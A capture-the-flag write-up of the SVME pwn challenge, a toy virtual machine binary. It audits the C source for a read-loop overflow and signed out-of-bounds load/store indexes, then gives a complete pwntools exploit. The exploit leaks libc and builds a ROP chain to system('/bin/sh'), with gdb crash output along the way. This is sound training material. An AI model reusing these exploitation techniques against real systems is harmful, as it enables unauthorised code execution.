## RealWorldCTF - SVME [Pwn] ( 93 solves )
### Difficulty: baby
**Description**

Professor Terence Parr has taught us [how to build a virtual machine](https://www.slideshare.net/parrt/how-to-build-a-virtual-machine). Now it's time to break it!

## General overview
The SVME binary challenge is a simple implementation of a small virtual machine as presented in Prof. Terence Parr slides in the description of the challenge. We can send 512 bytes of bytecode to the virtual machine and the virtual machine will run all the instructions which we sent to it.

## Binary details
```
$ file svme
svme: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=ac06c33f16248df7768fed3ecefb7e6a85ec5941, not stripped
```
Enabled protections:
```
$ checksec svme
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The provided libc is: `libc 2.31`

## Code audit
### `main.c`
```c
#include <stdbool.h>
#include <unistd.h>
#include "vm.h"

int main(int argc, char *argv[]) {
    int code[128], nread = 0;
    while (nread < sizeof(code)) {
        int ret = read(0, code+nread, sizeof(code)-nread);
        if (ret <= 0) break;
        nread += ret;
    }
    VM *vm = vm_create(code, nread/4, 0);
    vm_exec(vm, 0, true);
    vm_free(vm);
    return 0;
}
```
The very first thing I found was a buffer overflow in `main` while reading our input to the `code` buffer but actually I didn't use it at all for my exploit.
If an attacker sends exacly 128 bytes they will be copied to the `code` buffer and `nread` will be 128. But next time the attacker sends data to the program `code+nread` will cause a buffer overflow because the author does not realize that he is using pointer arithmetic and not simple addition to calculate where to write next to the `code` buffer. And if we carefully craft our payload we can bypass the stack canary too. Below is a simple example triggering the described buffer overflow:

```python3
from pwn import *
elf = context.binary = ELF('./svme')
io = gdb.debug('./svme')

# \x12 byte is telling the virtual machine to stop the execution of the program as soon as possible, so we are putting it first inorder to skip 
# the remainding payload that we are sending to avoid segfault in vm_exec function.
info('Skipping the stack canary!')
io.send(b'\x12'+b'\x00'*(128+3))

info('Buffer overflow!')
rbp = b'B'*8
rip = p64(0xdeadbeef)
padding = b'C'*400 # doesn't matter if we exceed 512 bytes the remaining bytes will be discarded.
io.send(rbp + rip + padding)

io.interactive()
```

Our crash!
```gdb
Program received signal SIGSEGV, Segmentation fault.
0x00000000deadbeef in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
 RAX  0x0
*RBX  0x55b4d12efd90 (__libc_csu_init) ◂— endbr64 
 RCX  0x0
*RDX  0x7fd23aed0be0 —▸ 0x55b4d31ac7c0 ◂— 0x0
*RDI  0x7fd23aed0b80 ◂— 0x0
 RSI  0x0
 R8   0x0
*R9   0x7c
*R10  0x7fd23aed0be0 —▸ 0x55b4d31ac7c0 ◂— 0x0
*R11  0x246
*R12  0x55b4d12ef140 (_start) ◂— endbr64 
*R13  0x7fffa8f791e0 ◂— 0x4343434343434343 ('CCCCCCCC')
 R14  0x0
 R15  0x0
*RBP  0x4242424242424242 ('BBBBBBBB')
*RSP  0x7fffa8f79100 ◂— 0x4343434343434343 ('CCCCCCCC')
*RIP  0xdeadbeef
────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────
Invalid address 0xdeadbeef
```

But ASLR+PIE is enabled so at the moment we are sending our payload we don't have any gadget to jump. So I started investigating the virtual machine code.

### `vm.c`
The source code of the implementation of the virtual machine was in a link inside the `Dockerfile`. 
[Source code](https://github.com/parrt/simple-virtual-machine-C/)

```c
typedef struct {
    int returnip;
    int locals[DEFAULT_NUM_LOCALS];
} Context;

typedef struct {
    int *code;
    int code_size;

    // global variable space
    int *globals;
    int nglobals;

    // Operand stack, grows upwards
    int stack[DEFAULT_STACK_SIZE];
    Context call_stack[DEFAULT_CALL_STACK_SIZE];
} VM;
```
We can see in `vm.h` that a program that we run in the virtual machine has a global space for storing global variables and stacks for local variables for calls.
Auditing the `vm.c` source code and trying to see how each instruction is implemented in the virtual machine I found 4 out-of-bounds vulnerabilities which I could use for crafting an exploit.

```c
    case LOAD: // load local or arg
        offset = vm->code[ip++];
        vm->stack[++sp] = vm->call_stack[callsp].locals[offset];
        break;
    case GLOAD: // load from global memory
        addr = vm->code[ip++];
        vm->stack[++sp] = vm->globals[addr];
        break;
    case STORE:
        offset = vm->code[ip++];
        vm->call_stack[callsp].locals[offset] = vm->stack[sp--];
        break;
    case GSTORE:
        addr = vm->code[ip++];
        vm->globals[addr] = vm->stack[sp--];
        break;
```

In each case we have a controllable offset which can be also negative because `addr` & `offset` variables are declared as signed integers. So in the case of load instructions we can nearly arbitrary read values and save them to the stack/globals. And in the case of store instrcutions we can nearly arbitrary write values from the stack to the target. We are limited here because offsets are 32 bit values and our application is 64 bit so we can't reach any address we like.

But the important clue here is that we have a stack address which we can reach with our out-of-bounds vulnerabilities. The `code` pointer is pointing to a buffer on the stack. So we can read the stack address save it to the `vm->stack` and try to overwrite the `vm->globals` variable so that it points to the actual stack inorder to craft a rop chain attack on the fly. We have to do this with steps of two because each address is 64 bit but we can load/save 32 bits at a time.

### Exploit
```python3
shellcode = [        
    # load the address of vm->code to the stack using GLOAD out-of-bounds vulnerability.
    # we can copy 4 bytes each time so we have to copy both the upper 4 and lower 4 bytes of vm->code.
    GLOAD_OP, 0xffffffff - 0x840 + 1 + 1,
    GLOAD_OP, 0xffffffff - 0x840 + 1,
    ICONST_OP, 0x218, # offset from vm->code address to main return address.
    IADD_OP, # add the offset.
    
    # the same out-of-bounds vulnerabilities exist for STORE & GSTORE instructions too.
    GSTORE_OP, 0xffffffff - 0x83c + 1, # here we have overwritten the 4 lower bytes of vm->globals variable.
    # after GSTORE we have corrupted vm->globals so we can't use GSTORE anymore, because GSTORE relies in vm->globals.
    # a work around is to use STORE insted.
    # you can implement this attack with STORE instructions only but here we want to use all of our bugs :)
    STORE_OP, 0xffffffff - 0x3e0 + 1,  # here we have overwritten the 4 higher bytes of vm->globals variable.
    
    # now vm->globals points to main's return address which currently is __libc_main_start+243
    
    GLOAD_OP, 0x0,
    ICONST_OP, 0x20b3, # __libc_main_start+243 offset.
    ISUB_OP, # We have calculated libc address.
    
    GSTORE_OP, 0x0, # Store libc starting address for future use.
    # you don't need to save the 4 upper bytes of libc address because main return address is __libc_start_main+243 which already has the upper 4 bytes filled
    # for us.

    # Start of the exploit chain.
    
    # overwrite vm_exec's return address.
    GLOAD_OP, 0x0, # load (4 lower bytes) libc address again.
    ICONST_OP, 0x1b72, # load pop rdi; ret; gadget.
    IADD_OP,

    # vm->globals[0xffffffff - 0x8f] = vm_exec return address
    # so writing after 0xffffffff - 0x8f we can fill a rop chain attack.

    GSTORE_OP, 0xffffffff - 0x8f,  # store first half of the gadget address.
    GLOAD_OP, 0x1, # load second half (upper 4 bytes) of libc address.
    GSTORE_OP, 0xffffffff - 0x8f + 1,  # store second half of the gadget address.
    
    GLOAD_OP, 0x0, # load libc address again.
    ICONST_OP, 0x1925aa, # /bin/sh offset
    IADD_OP,
    
    # Store /bin/sh to the stack for pop rdi; ret; gadget.
    GSTORE_OP, 0xffffffff - 0x8f + 2, 
    GLOAD_OP, 0x1,
    GSTORE_OP, 0xffffffff - 0x8f + 3, 
    
    # Store a simple ret; gadget to the stack to align the stack for system function.
    GLOAD_OP, 0x0, 
    ICONST_OP, 0x3043c, # ret gadget.
    IADD_OP,
    
    # store the ret gadget to the stack.
    GSTORE_OP, 0xffffffff - 0x8f + 4,
    GLOAD_OP, 0x1,
    GSTORE_OP, 0xffffffff - 0x8f + 5,
    
    # store system function to the stack.
    GLOAD_OP, 0x0, 
    ICONST_OP, 0x30410, # system offset
    IADD_OP, 
    
    GSTORE_OP, 0xffffffff - 0x8f + 6,
    GLOAD_OP, 0x1,
    GSTORE_OP, 0xffffffff - 0x8f + 7,
    
    HLT_OP # Terminate the program that is running inside the "virtual machine".
    
    # after hlt instruction the vm_exec function returns to our rop chain.
    # pop rdi; ret; ret; system;
]
```

## Full exploit
```python3
from pwn import *

s = lambda x: io.send(x)

elf = context.binary = ELF('svme', checksec = False)
libc = ELF('libc.so.6', checksec = False)

def start():
    gs = '''
        b *vm_exec+1738
    '''

    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    elif args.REMOTE:
        return remote('47.243.140.252', 1337)
    else:
        return process(elf.path) 


# OPCODES
IADD_OP   = 0x1
ISUB_OP   = 0x2
IMUL_OP   = 0x3
ILT_OP    = 0x4
IEQ_OP    = 0x5
BR_OP     = 0x6
BRT_OP    = 0x7
BRF_OP    = 0x8
ICONST_OP = 0x9
LOAD_OP   = 0x0a
GLOAD_OP  = 0x0b
STORE_OP  = 0x0c
GSTORE_OP = 0x0d
PRINT_OP  = 0x0e
POP_OP    = 0x0f
CALL_OP   = 0x10
RET_OP    = 0x11
HLT_OP    = 0x12

def parse_opcode(op):
    return p32(op)

def compile(shellcode):
    bytecode = b''
    for code in shellcode:
        bytecode += parse_opcode(code)
    return bytecode
    
io = start()

shellcode = [    
    # load the address of vm->code to the stack using GLOAD out-of-bounds vulnerability.
    # we can copy 4 bytes each time so we have to copy both the upper 4 and lower 4 bytes of vm->code.
    GLOAD_OP, 0xffffffff - 0x840 + 1 + 1,
    GLOAD_OP, 0xffffffff - 0x840 + 1,
    ICONST_OP, 0x218, # offset from vm->code address to main return address.
    IADD_OP, # add the offset.
    
    # the same out-of-bounds vulnerabilities exist for STORE & GSTORE instructions too.
    GSTORE_OP, 0xffffffff - 0x83c + 1, # here we have overwritten the 4 lower bytes of vm->globals variable.
    # after GSTORE we have corrupted vm->globals so we can't use GSTORE anymore, because GSTORE relies in vm->globals.
    # a work around is to use STORE insted.
    # you can implement this attack with STORE instructions only but here we want to use all of our bugs :)
    STORE_OP, 0xffffffff - 0x3e0 + 1,  # here we have overwritten the 4 higher bytes of vm->globals variable.
    
    # now vm->globals points to main's return address which currently is __libc_main_start+243
    
    GLOAD_OP, 0x0,
    ICONST_OP, 0x20b3, # __libc_main_start+243 offset.
    ISUB_OP, # We have calculated libc address.
    
    GSTORE_OP, 0x0, # Store libc starting address for future use.
    # you don't need to save the 4 upper bytes of libc address because main return address is __libc_start_main+243 which already has the upper 4 bytes filled
    # for us.

    # Start of the exploit chain.
    
    # overwrite vm_exec's return address.
    GLOAD_OP, 0x0, # load (4 lower bytes) libc address again.
    ICONST_OP, 0x1b72, # load pop rdi; ret; gadget.
    IADD_OP,

    # vm->globals[0xffffffff - 0x8f] = vm_exec return address
    # so writing after 0xffffffff - 0x8f we can fill a rop chain attack.

    GSTORE_OP, 0xffffffff - 0x8f,  # store first half of the gadget address.
    GLOAD_OP, 0x1, # load second half (upper 4 bytes) of libc address.
    GSTORE_OP, 0xffffffff - 0x8f + 1,  # store second half of the gadget address.
    
    GLOAD_OP, 0x0, # load libc address again.
    ICONST_OP, 0x1925aa, # /bin/sh offset
    IADD_OP,
    
    # Store /bin/sh to the stack for pop rdi; ret; gadget.
    GSTORE_OP, 0xffffffff - 0x8f + 2, 
    GLOAD_OP, 0x1,
    GSTORE_OP, 0xffffffff - 0x8f + 3, 
    
    # Store a simple ret; gadget to the stack to align the stack for system function.
    GLOAD_OP, 0x0, 
    ICONST_OP, 0x3043c, # ret gadget.
    IADD_OP,
    
    # store the ret gadget to the stack.
    GSTORE_OP, 0xffffffff - 0x8f + 4,
    GLOAD_OP, 0x1,
    GSTORE_OP, 0xffffffff - 0x8f + 5,
    
    # store system function to the stack.
    GLOAD_OP, 0x0, 
    ICONST_OP, 0x30410, # system offset
    IADD_OP, 
    
    GSTORE_OP, 0xffffffff - 0x8f + 6,
    GLOAD_OP, 0x1,
    GSTORE_OP, 0xffffffff - 0x8f + 7,
    
    HLT_OP # Terminate the program that is running inside the "virtual machine".
    
    # after hlt instruction the vm_exec function returns to our rop chain.
    # pop rdi; ret; ret; system;
]

bytecode = compile(shellcode)
padding = (512-len(bytecode))*p8(0)
s(bytecode+padding)

io.interactive()
```
